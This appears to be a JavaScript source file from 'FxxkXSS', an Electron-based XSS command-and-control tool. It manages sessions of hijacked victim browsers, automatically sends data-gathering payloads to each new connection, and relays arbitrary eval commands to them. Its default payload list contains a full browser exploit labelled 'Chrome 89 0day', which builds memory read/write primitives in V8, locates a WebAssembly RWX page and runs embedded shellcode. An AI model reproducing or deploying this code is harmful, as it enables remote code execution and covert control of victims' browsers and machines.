import Store from 'electron-store';
const store = new Store();

/**
 * 监听从主进程来的消息
 */

import { ipcRenderer } from 'electron';
import { directives } from './directive';

//消息侦听器缓存
let listener = [];

//现有连接
const cons = [];
const deccons = {};

//新连接侦听器
const new_con_listener = [];
//关闭连接侦听器
const close_con_listener = [];

export const index2id = index => {
    return log.sessions[index].id;
}

export const id2index = id => {
    return deccons[id.toString()];
}

//payload
export const payloads = store.get('config.payloads', {
    payloads : [{
        code : 'const a = 1;',
        title : 'demo',
    }, {
        code : `eval(\`var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
        var wasm_mod = new WebAssembly.Module(wasm_code);
        var wasm_instance = new WebAssembly.Instance(wasm_mod);
        var f = wasm_instance.exports.main;
        
        var buf = new ArrayBuffer(8);
        var f64_buf = new Float64Array(buf);
        var u64_buf = new Uint32Array(buf);
        let buf2 = new ArrayBuffer(0x150);
        
        function ftoi(val) {
            f64_buf[0] = val;
            return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
        }
        
        function itof(val) {
            u64_buf[0] = Number(val & 0xffffffffn);
            u64_buf[1] = Number(val >> 32n);
            return f64_buf[0];
        }
        
        const _arr = new Uint32Array([2**31]);
        
        function foo(a) {
            var x = 1;
            x = (_arr[0] ^ 0) + 1;
        
            x = Math.abs(x);
            x -= 2147483647;
            x = Math.max(x, 0);
        
            x -= 1;
            if(x==-1) x = 0;
        
            var arr = new Array(x);
            arr.shift();
            var cor = [1.1, 1.2, 1.3];
        
            return [arr, cor];
        }
        
        for(var i=0;i<0x3000;++i)
            foo(true);
        
        var x = foo(false);
        var arr = x[0];
        var cor = x[1];
        
        const idx = 6;
        arr[idx+10] = 0x4242;
        
        function addrof(k) {
            arr[idx+1] = k;
            return ftoi(cor[0]) & 0xffffffffn;
        }
        
        function fakeobj(k) {
            cor[0] = itof(k);
            return arr[idx+1];
        }
        
        var float_array_map = ftoi(cor[3]);
        
        var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
        var fake = fakeobj(addrof(arr2) + 0x20n);
        
        function arbread(addr) {
            if (addr % 2n == 0) {
                addr += 1n;
            }
            arr2[1] = itof((2n << 32n) + addr - 8n);
            return (fake[0]);
        }
        
        function arbwrite(addr, val) {
            if (addr % 2n == 0) {
                addr += 1n;
            }
            arr2[1] = itof((2n << 32n) + addr - 8n);
            fake[0] = itof(BigInt(val));
        }
        
        function copy_shellcode(addr, shellcode) {
            let dataview = new DataView(buf2);
            let buf_addr = addrof(buf2);
            let backing_store_addr = buf_addr + 0x14n;
            arbwrite(backing_store_addr, addr);
        
            for (let i = 0; i < shellcode.length; i++) {
                dataview.setUint32(4*i, shellcode[i], true);
            }
        }
        
        var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
        console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
        var shellcode = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];
        copy_shellcode(rwx_page_addr, shellcode);
        f();\`)`,
        title : 'Chrome 89 0day'
    }],
    current_id : 0
});

export const savePayloads = () => {
    store.set('config.payloads', payloads);
}

//log
export const log = {
    sessions : [
        {
            id : 999999999999,
            alive : true,
            logs : [{
                log : '[ NEW-CON ]:-1:GOT A NEW CONNECTION',
                class_name : 'green'
            }, {
                log : '[ LOG ]: 欢迎使用FxxkXSS，跟进最新的功能：https://github.com/Yeuoly/FxxkXSS',
                class_name : 'grey'
            }, {
                log : '[ TIP ]: 吃人啦吃人啦，开发团队招人啦',
                class_name : 'grey'
            }],
            ip : '127.0.0.1',
            proxy_domain : {
                proxy_host : '',
                proxy_port : '',
                proxy_server_name : ''
            }
        },
    ],
    current_index : 0,
}

export const getSession = id => log.sessions[id2index(id)];

export const getCurrentIndex = () => log.current_index;

export const isAlive = id => {
    const session = getSession(id);
    if(session){
        return session.alive;
    }
    return false;
}


export const addNewLog = (id, block, msg, color) => {
    getSession(id).logs.push({
        log : `[ ${block.toUpperCase()} ]:${msg}`,
        class_name : color
    });
}

//创建主要的事件侦听
ipcRenderer.on('xss_core.newcon', (ev, msg) => {
    cons.push({
        id : msg['id'],
    });
    //添加从id到index的映射
    deccons[msg['id'].toString()] = log.sessions.length;
    //添加新的log
    log.sessions.push({
        alive : true,
        //从index到id的映射
        id : msg['id'],
        logs: [{
            log : `[ NEW-CON ]:${msg['id']}:GOT A NEW CONNECTION`,
            class_name : 'green'
        },{
            log : `[ NEW-CON ]: 该对话的代理服务器为：${msg['info']['proxy_domain']}`,
            class_name : 'green'
        }],
        ip : msg['info']['ip'],
        proxy_domain : {
            host : msg['info']['proxy_host'],
            port : msg['info']['proxy_port'],
            server_name : msg['info']['proxy_server_name']
        }
    });
    new_con_listener.forEach( e => e(msg['id']) );
    //加载好侦听器以后直接发送几条比较重要的信息收集payload
    ipcRenderer.send('xss_core.sendmsg', { id : msg['id'], data : `window.cachex.send(eval("${directives[0].payload}"))`, type : 'command' });
    ipcRenderer.send('xss_core.sendmsg', { id : msg['id'], data : `window.cachex.send(eval("${directives[1].payload}"))`, type : 'command' });
    ipcRenderer.send('xss_core.sendmsg', { id : msg['id'], data : `window.cachex.send(eval("${directives[2].payload}"))`, type : 'command' });
});
ipcRenderer.on('xss_core.close', (ev, msg) => {
    //获取index
    const index = id2index(msg['id']);
    if(!index) return;

    listener = listener.filter( e => {
        return e.id !== msg['id'];
    });
    close_con_listener.forEach( e => {
        if(e.id == msg['id']){
            e.handler();
        }
    });
    getSession(msg['id']).alive = false;
});

ipcRenderer.on('xss_core.sendmsg', (ev, msg) => {
    listener.forEach( e => {
        if(e.id === msg['id']){
            e.handler(msg['data']);
        }
    });
});

export const addXSSListener = (id, handler) => {
    //首先判断这个id的con活着不
    for(const i of cons){
        if(i.id === id){
            listener.push({
                id, handler
            });
            break;
        }
    }
}

export const addNewConListener = cb => {
    new_con_listener.push(cb);
}

export const addCloseConListener = (id, handler) => {
    close_con_listener.push({
        id, handler
    });
}

export const evalOneLineByIndex = (index, command) => {
    //检测是否是指令
    for(const i of directives){
        if(i.directive === command.substr(0, i.directive.length)){
            //检测payload类型
            switch(typeof i.payload){
                case 'string':
                    command = i.payload;
                    break;
                case 'function':
                    command = i.payload(command.split(/[ ]/g).slice(1));
                    break;
                case 'object':
                    const id = index2id(index);
                    if(id === undefined) return;
                    i.payload.handler(getSession(id), command.split(/[ ]/g).slice(1));
                    return;
            }
            break;
        }
    }
    const id = index2id(index);
    for(const i of cons){
        if(i.id === id){
            ipcRenderer.send('xss_core.sendmsg', {
                id : id,
                data : `window.cachex.send(eval("${command}"))`,
                type : 'command'
            });
            addNewLog(id, 'command', `sent command : ${command}`, 'grey');
            break;
        }
    }
}

export const evalMultByIndex = (index, command, payload_name) => {
    const id = index2id(index);
    for(const i of cons){
        if(i.id === id){
            ipcRenderer.send('xss_core.sendmsg', {
                id : id,
                data : command,
                type : 'command'
            });
            addNewLog(id, 'command', `sent payload : ${payload_name}`, 'grey');
            break;
        }
    }
}